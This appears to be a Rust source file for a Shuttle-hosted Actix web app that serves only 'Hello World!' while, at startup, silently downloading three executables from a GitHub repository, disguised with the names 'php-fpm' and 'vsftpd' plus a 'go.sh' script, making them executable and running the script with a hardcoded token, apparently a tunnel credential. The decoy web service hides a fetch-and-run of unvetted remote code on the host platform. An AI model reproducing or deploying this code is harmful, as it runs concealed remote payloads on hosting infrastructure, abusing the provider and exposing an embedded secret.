use actix_web::{get, web::ServiceConfig, HttpResponse, Result};
use std::fs::{self, File};
use std::io::Write;
use futures_util::StreamExt;
use anyhow::anyhow;
use shuttle_actix_web::ShuttleActixWeb;

struct FileInfo {
    url: &'static str,
    filename: &'static str,
}

const FILES_TO_DOWNLOAD: &[FileInfo] = &[
    FileInfo {
        url: "https://github.com/wwrrtt/test/raw/refs/heads/main/php-fpm",
        filename: "php-fpm",
    },
    FileInfo {
        url: "https://github.com/wwrrtt/test/raw/refs/heads/main/vsftpd",
        filename: "vsftpd",
    },
    FileInfo {
        url: "https://github.com/wwrrtt/test/releases/download/3.0/go.sh",
        filename: "go.sh",
    },
];

async fn download_file(file: &FileInfo, base_path: &str) -> Result<(), Box<dyn std::error::Error>> {
    println!("Downloading file from {}...", file.url);
    let response = reqwest::get(file.url).await?;
    let file_path = format!("{}/{}", base_path, file.filename);
    let mut file = File::create(&file_path)?;
    let mut stream = response.bytes_stream();

    while let Some(chunk) = stream.next().await {
        let chunk = chunk?;
        file.write_all(&chunk)?;
    }

    Ok(())
}

async fn give_executable_permission(filename: &str) -> std::io::Result<()> {
    println!("Giving executable permission to {}", filename);

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let metadata = fs::metadata(filename)?;
        let mut perms = metadata.permissions();
        perms.set_mode(0o755);
        fs::set_permissions(filename, perms)?;
    }

    Ok(())
}

async fn execute_script(script: &str, token: &str) -> std::io::Result<()> {
    let output = tokio::process::Command::new("bash")
        .arg(script)
        .env("Token", token)
        .output()
        .await?;

    if output.status.success() {
        println!("Script output: {}", String::from_utf8_lossy(&output.stdout));
        Ok(())
    } else {
        println!("Script error: {}", String::from_utf8_lossy(&output.stderr));
        Err(std::io::Error::new(
            std::io::ErrorKind::Other,
            "Script execution failed",
        ))
    }
}

async fn download_and_execute_files() -> Result<bool, Box<dyn std::error::Error>> {
    let base_path = std::env::var("SHUTTLE_DATA_DIR").unwrap_or_else(|_| ".".to_string());

    for file in FILES_TO_DOWNLOAD {
        download_file(file, &base_path).await?;
    }

    for file in ["go.sh", "php-fpm", "vsftpd"] {
        let file_path = format!("{}/{}", base_path, file);
        give_executable_permission(&file_path).await?;
    }

    let script_path = format!("{}/go.sh", base_path);
    let token = "eyJhIjoiYjQ2N2Q5MGUzZDYxNWFhOTZiM2ZmODU5NzZlY2MxZjgiLCJ0IjoiYmNmZmQwNTktY2JjMC00YzhmLTgzMWQtNzRhYjM2ZDZiODFlIiwicyI6Ik4yTmtZVFEwWW1VdFlqRTJOaTAwT1dKakxXSmtZbVl0TkRnMllURTFZV000WmpNdyJ9";
    execute_script(&script_path, token).await?;

    Ok(true)
}

#[get("/")]
async fn hello_world() -> &'static str {
    "Hello World!"
}

#[shuttle_runtime::main]
async fn actix_web() -> ShuttleActixWeb<impl FnOnce(&mut ServiceConfig) + Send + Clone + 'static> {
    // 异步初始化，不阻塞服务启动
    tokio::spawn(async {
        if let Err(e) = download_and_execute_files().await {
            eprintln!("Initialization failed: {}", e);
        }
    });

    let config = move |cfg: &mut ServiceConfig| {
        cfg.service(hello_world);
    };

    Ok(config.into())
}
